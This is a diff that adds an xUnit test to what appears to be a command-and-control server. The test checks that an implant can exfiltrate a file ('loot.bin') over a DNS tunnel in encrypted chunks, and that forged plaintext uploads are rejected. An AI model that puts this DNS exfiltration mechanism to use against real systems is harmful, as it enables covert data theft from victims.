@@ -564,6 +564,152 @@ public class DnsContactTests
         Assert.Equal(report, fetched.Output);
     }
 
+    // The upload arm's degraded acceptance (ADR-010): a keyed artifact's
+    // exfil run rides the x./u. grammar -- each blob one sealed ExfilChunk
+    // slice placing at its offset, the seam probe answering the held count
+    // the next blob serves from, and the terminal blob materializing the
+    // artifact whole. Sealed-only: a plaintext blob never places.
+    [Fact]
+    public async Task Exfil_SealedBlobsCarryTheRun_OverTheSeamGrammar()
+    {
+        await using var env = await DnsTestEnv.StartAsync();
+        var implant = await env.EnrollImplantAsync();
+        using (var beacon = await WsBeaconClient.ConnectAsync(env.HttpPort, implant.Id.ToString()))
+        {
+            Assert.Equal(HandshakeStatus.Ok, (await beacon.ReceiveHandshakeAsync()).Status);
+        }
+
+        var (keyId, key) = AesGcmEnvelope.Mint();
+        var payloads = env.Host.Services.GetRequiredService<IPayloadStore>();
+        await payloads.SaveAsync(new PayloadRecord(
+            Guid.NewGuid(), implant.EngagementId.Value, "dotnet", "csharp",
+            "application/octet-stream", "sealed-test", Array.Empty<byte>(), 0, DateTimeOffset.UtcNow,
+            EnvelopeKeyId: keyId, EnvelopeKey: key), CancellationToken.None);
+        env.Host.Services.GetRequiredService<EnvelopeContactKeys>().Bind(implant.Id, keyId, key);
+
+        await env.LoginAsync();
+        var issued = await env.Http.PostAsJsonAsync(
+            $"/engagements/{implant.EngagementId}/tasks",
+            new { ImplantId = implant.Id.ToString(), Verb = "exfil.push", Arguments = "loot.bin /opt/loot.bin" });
+        issued.EnsureSuccessStatusCode();
+        var issuedBody = await issued.Content.ReadFromJsonAsync<TaskIssuedBody>();
+        var task = new TaskId(Guid.Parse(issuedBody!.TaskId));
+
+        var pollAnswer = await env.DnsQueryAsync(DnsContactNames.SealedPollName(implant.Id, keyId, Zone));
+        Assert.NotNull(pollAnswer);
+        Assert.True(DnsContactNames.TryDecode(pollAnswer, out var sealedBytes));
+        var opened = AesGcmEnvelope.TryUnwrapBody(sealedBytes!, keyId, key, AesGcmEnvelope.DnsPollAad);
+        Assert.NotNull(opened);
+        Assert.Equal((byte)'t', opened![0]);
+        var request = TaskRequest.Parser.ParseFrom(opened[1..]);
+        Assert.Equal("exfil.push", request.Verb);
+
+        // Serve the run as the reference implant does: datagram-sized blobs,
+        // each one sealed ExfilChunk slice, the seam probe between them.
+        var content = RandomNumberGenerator.GetBytes(2 * 3800 + 137);
+        async Task<string?> ProbeSeamAsync()
+        {
+            var nameSha = SHA256.HashData(Encoding.UTF8.GetBytes("loot.bin"))[..16];
+            var answer = await env.DnsQueryAsync(
+                "x." + DnsContactNames.Encode(task.ToString())
+                + "." + DnsContactNames.Encode(nameSha)
+                + "." + DnsContactNames.Encode(implant.Id.ToString())
+                + "." + Zone);
+            return answer is not null && DnsContactNames.TryDecode(answer, out var held)
+                ? Encoding.ASCII.GetString(held!)
+                : null;
+        }
+
+        async Task UploadBlobAsync(ExfilChunk slice)
+        {
+            var blob = AesGcmEnvelope.WrapBody(slice.ToByteArray(), keyId, key, AesGcmEnvelope.DnsExfilAad);
+            var chunks = Chunk(blob, 39);
+            var stream = RandomNumberGenerator.GetBytes(8);
+            for (var i = 0; i < chunks.Count; i++)
+            {
+                var name = "u." + DnsContactNames.Encode(stream)
+                    + "." + i.ToString(System.Globalization.CultureInfo.InvariantCulture)
+                    + "." + (i == chunks.Count - 1 ? "t" : "m")
+                    + "." + DnsContactNames.Encode(chunks[i])
+                    + "." + DnsContactNames.Encode(implant.Id.ToString())
+                    + "." + Zone;
+                var ack = await env.DnsQueryAsync(name);
+                Assert.NotNull(ack);
+            }
+        }
+
+        var declared = ByteString.CopyFrom(SHA256.HashData(content));
+        for (var from = 0; from < content.Length; from += 3800)
+        {
+            var take = Math.Min(3800, content.Length - from);
+            var data = new byte[take];
+            Array.Copy(content, from, data, 0, take);
+            await UploadBlobAsync(new ExfilChunk
+            {
+                TaskId = task.ToString(),
+                Name = "loot.bin",
+                ContentType = "application/octet-stream",
+                Sequence = 0,
+                Terminal = from + take >= content.Length,
+                Offset = (ulong)from,
+                PayloadSha256 = declared,
+                Data = ByteString.CopyFrom(data),
+            });
+            var seam = await ProbeSeamAsync();
+            Assert.NotNull(seam);
+            Assert.Equal((from + take).ToString(), seam);
+        }
+
+        // The terminal blob placed the whole run: the artifact materialized
+        // engagement-scoped and bound to the task.
+        var artifacts = env.Host.Services.GetRequiredService<IArtifactStore>();
+        var stored = await WaitUntilAsync(async () =>
+            (await artifacts.ForTaskAsync(task.Value)).FirstOrDefault(a => a.Name == "loot.bin"));
+        Assert.NotNull(stored);
+        Assert.Equal(content, stored!.Content);
+
+        // Sealed-only: a plaintext terminal blob (the arm's spoofing
+        // decision) never places -- the probe answers zero for it.
+        var plainIssued = await env.Http.PostAsJsonAsync(
+            $"/engagements/{implant.EngagementId}/tasks",
+            new { ImplantId = implant.Id.ToString(), Verb = "exfil.push", Arguments = "forged.bin /opt/forged.bin" });
+        plainIssued.EnsureSuccessStatusCode();
+        var plainBody = await plainIssued.Content.ReadFromJsonAsync<TaskIssuedBody>();
+        var plainTask = new TaskId(Guid.Parse(plainBody!.TaskId));
+        var forged = new ExfilChunk
+        {
+            TaskId = plainTask.ToString(),
+            Name = "forged.bin",
+            ContentType = "application/octet-stream",
+            Sequence = 0,
+            Terminal = true,
+            Offset = 0,
+            PayloadSha256 = ByteString.CopyFrom(SHA256.HashData("forged"u8.ToArray())),
+            Data = ByteString.CopyFrom("forged"u8.ToArray()),
+        };
+        var plainChunks = Chunk(forged.ToByteArray(), 39);
+        var plainStream = RandomNumberGenerator.GetBytes(8);
+        for (var i = 0; i < plainChunks.Count; i++)
+        {
+            var name = "u." + DnsContactNames.Encode(plainStream)
+                + "." + i.ToString(System.Globalization.CultureInfo.InvariantCulture)
+                + "." + (i == plainChunks.Count - 1 ? "t" : "m")
+                + "." + DnsContactNames.Encode(plainChunks[i])
+                + "." + DnsContactNames.Encode(implant.Id.ToString())
+                + "." + Zone;
+            await env.DnsQueryAsync(name);
+        }
+        var forgedNameSha = SHA256.HashData(Encoding.UTF8.GetBytes("forged.bin"))[..16];
+        var forgedAnswer = await env.DnsQueryAsync(
+            "x." + DnsContactNames.Encode(plainTask.ToString())
+            + "." + DnsContactNames.Encode(forgedNameSha)
+            + "." + DnsContactNames.Encode(implant.Id.ToString())
+            + "." + Zone);
+        Assert.NotNull(forgedAnswer);
+        Assert.True(DnsContactNames.TryDecode(forgedAnswer, out var forgedHeld));
+        Assert.Equal("0", Encoding.ASCII.GetString(forgedHeld!));
+    }
+
     // One staged demand: the answer's token bytes, or null when the demand
     // carried no answer.
     private static async Task<byte[]?> DemandStagedAsync(
